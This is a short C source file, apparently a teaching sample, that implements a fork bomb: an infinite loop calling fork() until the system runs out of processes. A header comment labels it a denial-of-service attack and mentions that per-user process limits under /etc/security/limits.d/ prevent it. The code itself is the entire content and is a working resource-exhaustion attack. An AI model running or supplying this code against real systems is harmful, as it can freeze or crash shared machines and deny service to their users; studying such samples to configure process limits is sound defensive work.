//Simple Fork Bomb - DoS Attack - Can be prevented by limiting number of processes a user can execute etc/security/limits.d/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>

int main()
{
 while(1)
  fork();
 return 0;
}